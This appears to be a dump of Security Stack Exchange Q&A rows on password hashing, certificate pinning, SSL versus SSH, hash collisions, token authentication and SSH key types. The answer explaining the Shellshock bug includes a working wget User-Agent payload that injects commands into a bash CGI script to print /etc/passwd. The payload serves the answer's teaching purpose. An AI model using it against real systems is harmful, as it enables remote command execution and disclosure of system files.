<li>Input password size is limited to 51 characters. In order to handle longer passwords, one has to <a href=""https://security.stackexchange.com/questions/6623/pre-hash-password-before-applying-bcrypt-to-avoid-restricting-password-length"">combine bcrypt with a hash function</a> (you hash the password and then use the hash value as the ""password"" for bcrypt). Combining cryptographic primitives is known to be dangerous (see above) so such games cannot be recommended on a general basis.</li>
</ul>

<h2>scrypt</h2>

<p><a href=""http://www.tarsnap.com/scrypt.html"" rel=""noreferrer"">scrypt</a> is a much newer construction (designed in 2009) which builds over PBKDF2 and a stream cipher called <a href=""http://en.wikipedia.org/wiki/Salsa20"" rel=""noreferrer"">Salsa20/8</a>, but these are just tools around the core strength of scrypt, which is <strong>RAM</strong>. scrypt has been designed to inherently use a lot of RAM (it generates some pseudo-random bytes, then repeatedly read them in a pseudo-random sequence). ""Lots of RAM"" is something which is hard to make parallel. A basic PC is good at RAM access, and will not try to read dozens of unrelated RAM bytes simultaneously. An attacker with a GPU or a FPGA will want to do that, and will find it difficult.</p>

<p>Advantages of scrypt:</p>

<ul>
<li>A PC, i.e. exactly what the <em>defender</em> will use when hashing passwords, is the most efficient platform (or close enough) for computing scrypt. The attacker no longer gets a boost by spending his dollars on GPU or FPGA.</li>
<li>One more way to tune the function: memory size.</li>
</ul>

<p>Drawbacks of scrypt:</p>

<ul>
<li>Still new (my own rule of thumb is to wait at least 5 years of general exposure, so no scrypt for production until 2014 - but, of course, it is best if <em>other people</em> try scrypt in production, because this gives extra exposure).</li>
<li>Not as many available, ready-to-use implementations for various languages.</li>
<li>Unclear whether the CPU / RAM mix is optimal. For each of the pseudo-random RAM accesses, scrypt still computes a hash function. A cache miss will be about 200 clock cycles, one SHA-256 invocation is close to 1000. There may be room for improvement here.</li>
<li>Yet another parameter to configure: memory size.</li>
</ul>

<h2>OpenPGP Iterated And Salted S2K</h2>

<p>I cite this one because you will use it if you do password-based file encryption with <a href=""http://www.gnupg.org/"" rel=""noreferrer"">GnuPG</a>. That tool follows the <a href=""http://tools.ietf.org/html/rfc4880"" rel=""noreferrer"">OpenPGP format</a> which defines its own password hashing functions, called ""Simple S2K"", ""Salted S2K"" and ""<a href=""http://tools.ietf.org/html/rfc4880#section-3.7.1.3"" rel=""noreferrer"">Iterated and Salted S2K</a>"". Only the third one can be deemed ""good"" in the context of this answer. It is defined as the hash of a very long string (configurable, up to about 65 megabytes) consisting of the repetition of an 8-byte salt and the password.</p>

<p>As far as these things go, OpenPGP's Iterated And Salted S2K is decent; it can be considered as similar to PBKDF2, with less configurability. You will very rarely encounter it outside of OpenPGP, as a stand-alone function.</p>

<h2>Unix ""crypt""</h2>

<p>Recent Unix-like systems (e.g. Linux), for validating user passwords, use iterated and salted variants of the <a href=""http://en.wikipedia.org/wiki/Crypt_%28C%29"" rel=""noreferrer"">crypt()</a> function based on good hash functions, with thousands of iterations. This is reasonably good. Some systems can also use bcrypt, which is better.</p>

<p>The old crypt() function, based on the <a href=""http://en.wikipedia.org/wiki/Data_Encryption_Standard"" rel=""noreferrer"">DES block cipher</a>, is <em>not</em> good enough:</p>

<ul>
<li>It is slow in software but fast in hardware, and can be made fast in software too but only when computing several instances in parallel (technique known as <a href=""http://en.wikipedia.org/wiki/SWAR"" rel=""noreferrer"">SWAR</a> or ""bitslicing""). Thus, the attacker is at an advantage.</li>
<li>It is still quite fast, with only 25 iterations.</li>
<li>It has a 12-bit salt, which means that salt reuse will occur quite often.</li>
<li>It truncates passwords to 8 characters (characters beyond the eighth are ignored) and it also drops the upper bit of each character (so you are more or less stuck with ASCII).</li>
</ul>

<p>But the more recent variants, which are active by default, will be fine.</p>

<h1><strong>Bad Password Hashing Functions</strong></h1>

<p>About everything else, in particular virtually every homemade method that people relentlessly invent.</p>

<p>For some reason, many developers insist on designing function themselves, and seem to assume that ""secure cryptographic design"" means ""throw together every kind of cryptographic or non-cryptographic operation that can be thought of"". See <a href=""https://security.stackexchange.com/questions/25585/is-my-developers-home-brew-password-security-right-or-wrong-and-why"">this question</a> for an example. The underlying principle seems to be that the sheer complexity of the resulting utterly tangled mess of instruction will befuddle attackers. In practice, though, the developer himself will be more confused by his own creation than the attacker.</p>

<p><strong>Complexity is bad. Homemade is bad. New is bad.</strong> If you remember that, you'll avoid 99% of problems related to password hashing, or cryptography, or even security in general.</p>

<p>Password hashing in Windows operating systems used to be <a href=""https://security.stackexchange.com/questions/2881/is-there-any-advantage-to-splitting-a-password/2883#2883"">mindbogglingly awful</a> and now is just terrible (unsalted, non-iterated MD4).</p>

<h1><strong>Key Derivation</strong></h1>

<p>Up to now, we considered the question of <em>hashing passwords</em>. A close problem is about transforming a password into a symmetric key which can be used for encryption; this is called <a href=""http://en.wikipedia.org/wiki/Key_derivation_function"" rel=""noreferrer"">key derivation</a> and is the first thing you do when you ""encrypt a file with a password"".</p>

<p>It is possible to make contrived examples of password hashing functions which are secure for the purpose of storing a password validation token, but terrible when it comes to generating symmetric keys; and the converse is equally possible. But these examples are very ""artificial"". For <em>practical</em> functions like the one described above:</p>

<ul>
<li>The output of a password hashing function is acceptable as a symmetric key, after possible truncation to the required size.</li>
<li>A Key Derivation Function can serve as a password hashing function as long as the ""derived key"" is long enough to avoid ""generic preimages"" (the attacker is just lucky and finds a password which yields the same output). An output of more than 100 bits or so will be enough.</li>
</ul>

<p>Indeed, PBKDF2 and scrypt are KDF, not password hashing function -- and NIST ""approves"" of PBKDF2 as a KDF, not explicitly as a password hasher (but it is possible, with only a very minute amount of hypocrisy, to read NIST's prose in such a way that it seems to say that PBKDF2 is good for hashing passwords).</p>

<p>Conversely, bcrypt is really a <a href=""http://en.wikipedia.org/wiki/Block_cipher"" rel=""noreferrer"">block cipher</a> (the bulk of the password processing is the ""key schedule"") which is then used in <a href=""http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Counter_.28CTR.29"" rel=""noreferrer"">CTR mode</a> to produce three blocks (i.e. 192 bits) of pseudo-random output, making it a kind of hash function. bcrypt can be turned into a KDF with a little surgery, by using the block cipher in CTR mode for more blocks. But, as usual, we cannot recommend such homemade transforms. Fortunately, 192 bits are already more than enough for most purposes (e.g. symmetric encryption with <a href=""http://en.wikipedia.org/wiki/Galois/Counter_Mode"" rel=""noreferrer"">GCM</a> or <a href=""http://en.wikipedia.org/wiki/EAX_mode"" rel=""noreferrer"">EAX</a> only needs a 128-bit key).</p>

<h1><strong>Miscellaneous Topics</strong></h1>

<h2>How many iterations ?</h2>

<p>As much as possible ! This salted-and-slow hashing is an <em>arms race</em> between the attacker and the defender. You use many iterations to make the hashing of a password harder for <em>everybody</em>. To improve security, you should set that number as high as you can tolerate on your server, given the tasks that your server must otherwise fulfill. Higher is better.</p>

<h2>Collisions and MD5</h2>

<p>MD5 is <em>broken</em>: it is computationally easy to find a lot of pairs of distinct inputs which hash to the same value. These are called <em>collisions</em>.</p>

<p>However, <strong>collisions are not an issue for password hashing</strong>. Password hashing requires the hash function to be resistant to <em>preimages</em>, not to collisions. Collisions are about finding pairs of messages which give the same output <em>without restriction</em>, whereas in password hashing the attacker must find a message which yields a <em>given</em> output that the attacker does not get to choose. This is quite different. As far as we known, MD5 is still (almost) as strong as it has ever been with regards to preimages (there is a <a href=""http://www.iacr.org/archive/eurocrypt2009/54790136/54790136.pdf"" rel=""noreferrer"">theoretical attack</a> which is still very far in the ludicrously impossible to run in practice).</p>

<p>The <em>real problem</em> with MD5 as it is commonly used in password hashing is that it is very fast, and unsalted. However, PBKDF2 used with MD5 would be robust. You should still use SHA-1 or SHA-256 with PBKDF2, but for Public Relations. People get nervous when they hear ""MD5"".</p>

<h2>Salt Generation</h2>

<p>The main and only point of the salt is to be as <em>unique</em> as possible. Whenever a salt value is reused <em>anywhere</em>, this has the potential to help the attacker.</p>

<p>For instance, if you use the <em>user name</em> as salt, then an attacker (or several colluding attackers) could find it worthwhile to build rainbow tables which attack the password hashing function when the salt is ""admin"" (or ""root"" or ""joe"") because there will be several, possibly many sites around the world which will have a user named ""admin"". Similarly, when a user changes his password, he usually keeps his name, leading to salt reuse. Old passwords are valuable targets, because users have the habit of reusing passwords in several places (that's known to be a bad idea, and advertised as such, but they will do it nonetheless because it makes their life easier), and also because people tend to generate their passwords ""in sequence"": if you learn that Bob's old password is ""SuperSecretPassword37"", then Bob's <em>current</em> password is probable ""SuperSecretPassword38"" or ""SuperSecretPassword39"".</p>

<p>The <strong>cheap way</strong> to obtain uniqueness is to use <em>randomness</em>. If you generate your salt as a sequence of random bytes from the <a href=""http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"" rel=""noreferrer"">cryptographically secure PRNG</a> that your operating system offers (<code>/dev/urandom</code>, <code>CryptGenRandom()</code>...) then you will get salt values which will be ""unique with a sufficiently high probability"". 16 bytes are enough so that you will never see a salt collision in your life, which is overkill but simple enough.</p>

<p><a href=""http://en.wikipedia.org/wiki/Universally_unique_identifier"" rel=""noreferrer"">UUID</a> are a standard way of generating ""unique"" values. Note that ""version 4"" UUID just use randomness (122 random bits), like explained above. A lot of programming frameworks offer simple to use functions to generate UUID on demand, and they can be used as salts.</p>

<h2>Salt Secrecy</h2>

<p>Salts are not meant to be secret; otherwise we would call them <em>keys</em>. You do not <em>need</em> to make salts public, but if you have to make them public (e.g. to support client-side hashing), then don't worry too much about it. Salts are there for uniqueness. Strictly speaking, the salt is nothing more than the selection of a specific hash function within a big family of functions.</p>

<h2>""Pepper""</h2>

<p>Cryptographers can never let a metaphor alone; they <em>must</em> extend it with further analogies and bad puns. ""Peppering"" is about using a secret salt, i.e. a key. If you use a ""pepper"" in your password hashing function, then you are switching to a quite different kind of cryptographic algorithm; namely, you are computing a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""noreferrer"">Message Authentication Code</a> over the password. The MAC key is your ""pepper"".</p>

<p>Peppering makes sense if you can have a secret key which the attacker will not be able to read. Remember that we use password hashing because we consider that an attacker could grab a copy of the server database, or possible of the <em>whole disk</em> of the server. A typical scenario would be a server with two disks in <a href=""http://en.wikipedia.org/wiki/RAID#RAID_1"" rel=""noreferrer"">RAID 1</a>. One disk fails (electronic board fries - this happens a lot). The sysadmin replaces the disk, the mirror is rebuilt, no data is lost due to the magic of RAID 1. Since the old disk is dysfunctional, the sysadmin cannot easily wipe its contents. He just discards the disk. The attacker searches through the garbage bags, retrieves the disk, replaces the board, and lo! He has a complete image of the whole server system, including database, configuration files, binaries, operating system... the full monty, as the British say. For peppering to be really applicable, you need to be in a special setup where there is something more than a PC with disks; you need a <a href=""http://en.wikipedia.org/wiki/Hardware_security_module"" rel=""noreferrer"">HSM</a>. HSM are very expensive, both in hardware and in operational procedure. But with a HSM, you can just use a secret ""pepper"" and process passwords with a simple <a href=""http://en.wikipedia.org/wiki/Hash-based_message_authentication_code"" rel=""noreferrer"">HMAC</a> (e.g. with SHA-1 or SHA-256). This will be vastly more efficient than bcrypt/PBKDF2/scrypt and their cumbersome iterations. Also, usage of a HSM will look extremely professional when doing a <a href=""http://www.webtrust.org/item64428.aspx"" rel=""noreferrer"">WebTrust audit</a>.</p>

<h2>Client-side hashing</h2>

<p>Since hashing is (deliberately) expensive, it could make sense, in a client-server situation, to harness the CPU of the connecting clients. After all, when 100 clients connect to a single server, the clients collectively have a lot more muscle than the server.</p>

<p>To perform client-side hashing, the communication protocol must be enhanced to support sending the salt back to the client. This implies an extra round-trip, when compared to the simple client-sends-password-to-server protocol. This may or may not be easy to add to your specific case.</p>

<p>Client-side hashing is difficult in a Web context because the client uses Javascript, which is quite anemic for CPU-intensive tasks.</p>

<p>In the context of <a href=""http://en.wikipedia.org/wiki/Secure_Remote_Password_protocol"" rel=""noreferrer"">SRP</a>, password hashing necessarily occurs on the client side.</p>

<h1><strong>Conclusion</strong></h1>

<p>Use bcrypt. PBKDF2 is not bad either. If you use scrypt you will be a ""slightly early adopter"" with the risks that are implied by this expression; but it would be a good move for scientific progress (""crash dummy"" is a very honourable profession).</p>
","31846"
"What is certificate pinning?","166675","","<p>I'm superficially familiar with SSL and what certs do. Recently I saw some discussion on cert pinning but there wasn't a definition. A DDG search didn't turn up anything useful. What is certificate pinning?</p>
","<p>Typically certificates are validated by checking the signature hierarchy; <code>MyCert</code> is signed by <code>IntermediateCert</code> which is signed by <code>RootCert</code>, and RootCert is listed in my computer's ""certificates to trust"" store.</p>

<p>Certificate Pinning is where you ignore that whole thing, and say trust <em>this certificate only</em> or perhaps trust only certificates <em>signed by this certificate</em>. </p>

<p>So for example, if you go to google.com, your browser will trust the certificate if it's signed by Verisign, Digicert, Thawte, or the Hong Kong Post Office (and dozens others). But if you use (on newer versions) Microsoft Windows Update, it will ONLY trust certificates signed by Microsoft. No Verisign, no Digicert, no Hong Kong Post office. </p>

<p>Also, some newer browsers (Chrome, for example) will do a variation of certificate pinning using the <a href=""http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security"">HSTS</a> mechanism. They preload a specific set of public key hashes into this the HSTS configuration, which limits the valid certificates to <em>only</em> those which indicate the specified public key.</p>
","29990"
"Is Adblock (Plus) a security risk?","161859","","<p>My email-provider's website (<code>http://www.gmx.de</code>) recently started linking to the (German) site <code>http://www.browsersicherheit.info/</code> which basically claims that due to its capabilities to modify a site's appearance, Adblock Plus (and others) might actually be abused for phising. Here's a quote from that site plus its translation:</p>

<blockquote>
  <p>Solche Add-ons haben Zugriff auf alle Ihre Eingaben im Browser und können diese auch an Dritte weitergeben – auch Ihr Bank-Passwort. Dies kann auf allen Web-Seiten passieren. Sicherheitsmechanismen wie SSL können das nicht verhindern.</p>
</blockquote>

<p>translated:</p>

<blockquote>
  <p>Such addons can access all your browser's input and can also forward them to third parties - even your banking password. This can happen on all websites. Security mechanisms such as SSL cannot avoid that.</p>
</blockquote>

<p>Ok, they mention other (pretty obviously crapware) addons, but is Adblock Plus really a security threat or do that site's operators simply use the opportunity to try and scare inexperienced users into viewing their ads again?</p>
","<p><strong>It is not.</strong> This is a FUD (<a href=""http://en.wikipedia.org/wiki/Fear,_uncertainty_and_doubt"">fear, uncertainty, and doubt</a>) campaign by GMX because they want to display their ads. There is absolutely no security risk from the mentioned ad blockers. They added some crapware to the list to make it look more legitimate.</p>

<p>Of course such campaigns are very unusual, especially from such a big and well known company like GMX. Unfortunately, I have no English source at hand (because it's a German only campaign) but since you speak German you may want to read <a href=""http://www.heise.de/newsticker/meldung/Seitenmanipulierende-Add-ons-United-Internet-startet-Kampagne-gegen-Adblocker-2125592.html"">this article at heise.de</a>.</p>

<p>Update #1: United Internet, the company behind GMX, received a lot of criticism for misleading customers by falsely claiming that there is a security risk on their PC. The <a href=""http://blogs.wsj.de/wsj-tech/2014/02/27/gmx-und-web-de-werbeblocker/"">Wall Street Journal (German edition)</a> named the warnings displayed on GMX and the site they link to a ""scare campaign"".</p>

<p>Update #2: GMX now says that they will no longer display the link when you use ad blockers but will still display it if you use crapware that injects adverts, the list at the site <code>http://www.browsersicherheit.info/</code> has been updated accordingly and now lists only a small collection of crapware. This list is by no means complete so it is not a reliable source when you want to know if your browser has crapware installed. However, United Internet still maintains it's position that they do not want users who visit their sites to use ad blockers and said they will develop other anti-blocking methods in the future (<a href=""http://www.heise.de/newsticker/meldung/United-Internet-Adblocker-Warnungen-vorerst-beendet-2127834.html"">German source</a>).</p>
","52368"
"What is the difference between SSL vs SSH? Which is more secure?","156650","","<p>What is the difference between SSH and SSL?   Which one is more secure, if you <strong>can compare them</strong> together?<br>
Which has more potential vulnerabilities?</p>
","<p>SSL and SSH both provide the cryptographic elements to build a tunnel for confidential data transport with checked integrity. For that part, they use similar techniques, and may suffer from the same kind of attacks, so they should provide similar security (i.e. good security) assuming they are both properly implemented. That both exist is a kind of <a href=""http://en.wikipedia.org/wiki/Not_Invented_Here"">NIH</a> syndrome: the SSH developers should have reused SSL for the tunnel part (the SSL protocol is flexible enough to accommodate many variations, including not using certificates).</p>

<p>They differ on the things which are around the tunnel. SSL traditionally uses X.509 certificates for announcing server and client public keys; SSH has its own format. Also, SSH comes with a set of protocols for what goes <em>inside</em> the tunnel (multiplexing several transfers, performing password-based authentication within the tunnel, terminal management...) while there is no such thing in SSL, or, more accurately, when such things are used in SSL they are not considered to be part of SSL (for instance, when doing password-based HTTP authentication in a SSL tunnel, we say that it is part of ""HTTPS"", but it really works in a way similar to what happens with SSH).</p>

<p>Conceptually, you could take SSH and replace the tunnel part with the one from SSL. You could also take HTTPS and replace the SSL thing with SSH-with-data-transport and a hook to extract the server public key from its certificate. There is no scientific impossibility and, if done properly, security would remain the same. However, there is no widespread set of conventions or existing tools for that.</p>

<p>So we do not use SSL and SSH for the same things, but that's because of what tools historically came with the implementations of those protocols, <em>not</em> due to a security related difference. And whoever implements SSL or SSH would be well advised to look at what kind of attacks were tried on both protocols.</p>
","1605"
"Is SHA1 better than md5 only because it generates a hash of 160 bits?","152465","","<p>It is well known that SHA1 is recommended more than md5 for hashing since md5 is practically broken as lot of collisions have been found. 
With the birthday attack, it is possible to get a collision in md5 with 2^64 complexity and with 2^80 complexity in SHA1</p>

<p>It is known that there are algorithms that are able to crack both of these in far lesser time than it takes for a birthday attack.</p>

<p>My question is : is Md5 considered insecure only for this reason that it is easy to produce collisions ? Because looking at both, Producing collisions in SHA1 is not that difficult either. So what makes SHA1 better ?</p>

<p>Update 02/2017 - <a href=""https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html"" rel=""nofollow noreferrer"">https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html</a></p>
","<p>Producing SHA-1 collisions is not <em>that</em> easy. It seems reasonable that the attack with has been described on SHA-1 really works with an average cost of 2<sup>61</sup>, much faster than the generic birthday attack (which is in 2<sup>80</sup>), but still quite difficult (<a href=""https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html"" rel=""nofollow noreferrer"">doable</a>, but expensive).</p>

<p>That being said, we do not really know what makes hash functions resistant (see for instance <a href=""https://security.stackexchange.com/a/19658/5411"">this answer</a> for a detailed discussion). With a lot of hand-waving, I could claim that SHA-1 is more robust than MD5 because it has more rounds and because the derivation of the 80 message words in SHA-1 is much more ""mixing"" than that of MD5 (in particular the 1-bit rotation, which, by the way, is the only difference between SHA-0 and SHA-1, and SHA-0 collisions have been produced).</p>

<p>For more of the same, look at SHA-256, which is much more ""massive"" (many more operations than SHA-1, yet with a similar structure), and currently unbroken. It is as if there was a minimal amount of operations for a hash function to be secure, for a given structure (but there I am moving my hands at stupendous speed, so don't believe that I said anything really scientific or profound).</p>
","19712"
"How to figure out if someone has been using TeamViewer 8 to access my computer when I was not here?","146757","","<p>I came to my computer today and have not been here since monday afternoon. I am using windows 7. There were some error messages showing even on the log in screen about memory violations done by spotify and one more (I can't remember), and I just clicked them away, even though it is not normal on my PC. Sometimes it freezes on the login screen and I have to reboot, but this was different. But I did not take a note of the messages as I just didn't care.</p>

<p>After logging in, I noticed that my Teamviewer client was running (the GUI was showing). I thought this was odd, since I haven't been using it lately. I was a bit curious, so I checked the log. I will not include it here, as I don't know how to read it and I do not know what could identify me. It seems that it was an update leading to this, but I am not sure. Probably, but I don't like the fact that the GUI was showing with my ID and password showing. They could have silently updated it or have given me a message...</p>

<p>So, this leads me to the question: How to figure out if someone has been using TeamViewer 8 to access my computer when I was not here? What to look for in logs and perhaps the Windows 7 event logs? And a bonus Q: Is it safe to have TeamViewer 8 running in the background at all?</p>
","<p>Running Teamviewer isn't very secure: <a href=""https://www.optiv.com/blog/teamviewer-authentication-protocol-part-1-of-3"">read here</a></p>

<p>To determine who was logged in - look here: </p>

<ul>
<li>C:\Program Files\TeamViewer\VersionX\Connections_incoming.txt</li>
<li>C:\Users\XXX\AppData\Roaming\TeamViewer\Connections.txt</li>
</ul>
","35229"
"Google Chrome ""Your connection to website is encrypted with obsolete cryptography""","139780","","<p>Google Chrome is showing new information in the certificate section.</p>

<p><img src=""https://i.imgur.com/3Sz91LQ.png"" alt=""image""></p>

<p>Is this a big deal? If so how can I fix it on the server end?</p>

<p>EDIT: Thanks for the answers but I'm not skilled in cryptography so the only thing I can update with is this certificate was created by Shell in a Box, and I was also wondering if this was ruining the security of TLS/SSL communication with the application and if so, how I could fix it.</p>
","<p>Your exact case is that <code>RSA</code> is used as the key exchange mechanism. Instead, you should use <code>DHE_RSA</code> or <code>ECDHE_RSA</code>.</p>

<p>To remove the ""obsolete cryptography"" warning, you'll need to use ""modern cryptography"" which is defined as:</p>

<ul>
<li><strong>Protocol:</strong> <code>TLS 1.2</code> or <code>QUIC</code></li>
<li><strong>Cipher:</strong> <code>AES_128_GCM</code> or <code>CHACHA20_POLY1305</code></li>
<li><strong>Key exchange:</strong> <code>DHE_RSA</code> or <code>ECDHE_RSA</code> or <code>ECDHE_ECDSA</code></li>
</ul>

<p>Twitter discussion: <a href=""https://twitter.com/reschly/status/534956038353477632"">https://twitter.com/reschly/status/534956038353477632</a></p>

<p>Commit: <a href=""https://codereview.chromium.org/703143003"">https://codereview.chromium.org/703143003</a></p>

<p>This has nothing to do with a certificate. There is a special ""outdated security settings"" warning when a certificate uses weak signature algorithm, but this is about authentication, not about encryption. Note that you are still getting a green lock, even in case of obsolete encryption.</p>
","83891"
"What is a specific example of how the Shellshock Bash bug could be exploited?","139680","","<p>I read some articles (<a href=""https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"">article1</a>, <a href=""http://blog.erratasec.com/2014/09/bash-bug-as-big-as-heartbleed.html#.VCNWB2QbDBk"">article2</a>, <a href=""http://seclists.org/oss-sec/2014/q3/650"">article3</a>, <a href=""http://blog.sucuri.net/2014/09/bash-shellshocker-attacks-increase-in-the-wild-day-1.html"">article4</a>) about the <a href=""https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29"">Shellshock</a> Bash bug (<a href=""http://seclists.org/oss-sec/2014/q3/650"">CVE-2014-6271</a> reported Sep 24, 2014) and have a general idea of what the vulnerability is and how it could be exploited. To better understand the implications of the bug, what would be a simple and specific example of an attack vector / scenario that could exploit the bug?</p>
","<p>A very simple example would be a cgi, /var/www/cgi-bin/test.cgi:</p>

<pre><code>#!/bin/bash
echo ""Content-type: text/plain""
echo 
echo
echo ""Hi""
</code></pre>

<p>Then call it with wget to swap out the User Agent string.  E.g. this will show the contents of /etc/passwd:</p>

<pre><code>wget -U ""() { test;};echo \""Content-type: text/plain\""; echo; echo; /bin/cat /etc/passwd"" http://10.248.2.15/cgi-bin/test.cgi
</code></pre>

<p>To break it down:</p>

<pre><code>""() { test;};echo \""Content-type: text/plain\""; echo; echo; /bin/cat /etc/passwd""
</code></pre>

<p>Looks like:</p>

<pre><code>() {
    test
}
echo \""Content-type: text/plain\""
echo
echo
/bin/cat /etc/passwd
</code></pre>

<p>The problem as I understand it is that while it's okay to define a function in an environment variable, bash is not supposed to execute the code after it.</p>

<p>The extra ""Content-type:"" is only for illustration.  It prevents the 500 error and shows the contents of the file.</p>

<p>The above example also shows how it's not a problem of programming errors, even normally safe and harmless bash cgi which doesn't even take user input can be exploited.</p>
","68203"
"Understanding 2048 bit SSL and 256 bit encryption","138844","","<p>On DigiCert's page, they advertise a 2048 bit SSL with a 256 bit encryption: <a href=""http://www.digicert.com/256-bit-ssl-certificates.htm"" rel=""noreferrer"">http://www.digicert.com/256-bit-ssl-certificates.htm</a></p>

<p>What exactly is the difference here and why are two encryption bits being referenced?</p>

<p>Here's a screenshot of the ad:</p>

<p><a href=""https://i.stack.imgur.com/w3T6Q.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/w3T6Q.jpg"" alt=""""></a></p>

<p>On Geotrust's Premium SSL ad, they advertise it as: </p>

<p><strong><code>Security: domain control validation, strong 256-bit encryption, 2048-bit root</code></strong></p>

<p>So what's the difference between 256 bit encryption and 2048 bit root?</p>

<p>Hope that clarifies the question.</p>
","<p>The 2048-bit is about the RSA key pair: RSA keys are mathematical objects which include a big integer, and a ""2048-bit key"" is a key such that the big integer is larger than <em>2<sup>2047</sup></em> but smaller than <em>2<sup>2048</sup></em>.</p>

<p>The 256-bit is about SSL. In SSL, the server key is used only to transmit a random 256-bit key (<em>that</em> one does not have mathematical structure, it is just a bunch of bits); roughly speaking, the client generates a random 256-bit key, encrypts it with the server's RSA public key (the one which is in the server's certificate and is a ""2048-bit key""), and sends the result to the server. The server uses its private RSA key to reverse the operation, and thus obtain the 256-bit key chosen by the client. Afterwards, client and server use the 256-bit to do <em>symmetric</em> encryption and integrity checks, and RSA is not used any further for that connection.</p>

<p>See <a href=""https://security.stackexchange.com/questions/6290/how-is-it-possible-that-people-observing-an-https-connection-being-established-w/6296#6296"">this answer</a> for some more details. This setup is often called ""hybrid encryption"". This is done because RSA is not appropriate for bulk encryption, but symmetric encryption cannot do the initial public/private business which is needed to get things started.</p>

<p>(SSL can do the key exchange with other algorithms than RSA so I have simplified description a bit in the text above, but that's the gist of the idea.)</p>
","19477"
"Token-based authentication - Securing the token","133444","","<p>I have developed a backend REST API for a mobile app and I am now looking to implement token-based authentication for it to avoid having to prompt the user to login on every run of the app.</p>

<p>What I had in mind was on the initial request the user sends their credentials using Basic authentication over SSL. Once the server authenticates the credentials it creates a secure token and sends it back to the user so they can use it in subsequent requests until the token either expires or is revoked.</p>

<p>I am looking for some advice as to how I can generate a token which won't be susceptible to things like MoM/Replay attacks as well as ensuring the data stored within the token cannot be extracted out.</p>

<p>I am going to use the following <a href=""https://stackoverflow.com/questions/840537/generating-cryptographically-secure-authentication-tokens"">approach</a> to generate the token which I think would prevent any data from being extracted from it. However, I still need to make sure it's not vurnerable from other attacks.</p>

<p>The API will only be accessible over SSL but I am not sure if I can rely solely on this from a security perspective.</p>
","<p>The ""authentication token"" works by how the server remembers it.</p>

<p>A generic token is a random string; the server keeps in its database a mapping from emitted tokens to authenticated user names. Old tokens can be removed automatically in order to prevent the server's database from growing indefinitely. Such a token is good enough for security as long as an attacker cannot create a valid token with non-negligible probability, a ""valid token"" being ""a token which is in the database of emitted tokens"". It is <em>sufficient</em> that token values have length at least 16 bytes and are produced with a cryptographically strong PRNG (e.g. <code>/dev/urandom</code>, <code>CryptGenRandom()</code>, <code>java.security.SecureRandom</code>... depending on your platform).</p>

<p>It is possible to offload the storage requirement on the clients themselves. In the paragraph above, what ""memory"" should the server have of a token ? Namely the user name, and the date of production of the token. So, create your tokens like this:</p>

<ul>
<li>Server has a secret key <em>K</em> (a sequence of, say, 128 bits, produced by a cryptographically secure PRNG).</li>
<li>A token contains the user name (<em>U</em>), the time of issuance (<em>T</em>), and a <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"">keyed integrity check</a> computed over <em>U</em> and <em>T</em> (together), keyed with <em>K</em> (by default, use <a href=""http://tools.ietf.org/html/rfc2104"">HMAC</a> with SHA-256 or SHA-1).</li>
</ul>

<p>Thanks to his knowledge of <em>K</em>, the server can verify that a given token, sent back by the user, is one of its owns or not; but the attacker cannot forge such tokens.</p>

<p>The answer you link to looks somewhat like that, except that it talks about <em>encryption</em> instead of MAC, and that's:</p>

<ol>
<li>confused;</li>
<li>confusing;</li>
<li>potentially insecure;</li>
</ol>

<p>because encryption is not MAC.</p>
","19686"
"HTTPS icon red and crossed out - Chrome browser","133190","","<p>What does it actually mean when the HTTPS icon is red and crossed out in Chrome?</p>

<p>Does this mean that the site is vulnerable to a Man in the Middle Attack? Is it safe or not?</p>
","<p>When the https portion of the URL in Chrome has a red line through it, there is a problem with the security of the site you are going to.  To see exactly what the problem is, you need to click on the padlock and see the detailed connection info.</p>

<p>Detailed connection info is <a href=""https://support.google.com/chrome/answer/95617?hl=en"">documented here</a>.</p>

<p>If you see <img src=""https://i.stack.imgur.com/Vr8IB.png"" alt=""green padlock"">, then you've established a secure connection with a trusted site, and do not need to worry about MITM attacks.</p>

<p>If you see <img src=""https://i.stack.imgur.com/RAZ05.png"" alt=""yellow bang"">, then the connection is unencrypted, and subject to MITM attacks.</p>

<p>If you see <img src=""https://i.stack.imgur.com/OwWnB.png"" alt=""grey padlock""> or <img src=""https://i.stack.imgur.com/ivuCw.png"" alt=""red padlock"">, then either the connection is only partially encrypted or it's encrypted with a party that's not trusted (e.g., a self signed cert, name mismatch, or imposter).  In these cases you <em>may</em> be subject to a MITM attack.</p>

<p>With these last two, the level of exposure varies.  It might be that the remote site is properly encrypted, but just happens to have a few ""IMG SRC=http://..."" tags that cause mixed content.  That ""mixed content"" can be sniffed on the network.  Or, it might be that you've gone to an impostor site ""gooogle.com"" instead of ""google.com"", and everything you send is encrypted but going to a malicious attacker.  Or anywhere in between.  The rule of thumb is, essentially, unless you understand why it's red, you shouldn't trust it.</p>
","85729"
"SSH key-type, rsa, dsa, ecdsa, are there easy answers for which to choose when?","129852","","<p>As someone who knows little about cryptography, I wonder about the choice I make when creating ssh-keys.</p>

<p><code>ssh-keygen -t type</code>, where type is either of dsa,rsa and ecdsa.</p>

<p>Googling can give <em>some</em> information about differences between the types, but not anything conclusive. So my question is, are there any ""easy"" answers for developers/system administrators with little cryptography knowledge, when to choose which key type?</p>

<p>I'm hoping for an answer in the style of ""Use DSA for X and Y, RSA for Z, and ECDSA for everything else"", but I also realise it's quite possible such simple answers are not available.</p>
","<p>In practice, a RSA key will work everywhere. ECDSA support is newer, so some old client or server may have trouble with ECDSA keys.  A DSA key used to work everywhere, as per the SSH standard (<a href=""http://tools.ietf.org/html/rfc4251"">RFC 4251</a> and subsequent), but this changed recently: OpenSSH 7.0 and higher no longer accept DSA keys by default.</p>

<p>ECDSA is computationally lighter, but you'll need a really small client or server (say 50 MHz embedded ARM processor) to notice the difference.</p>

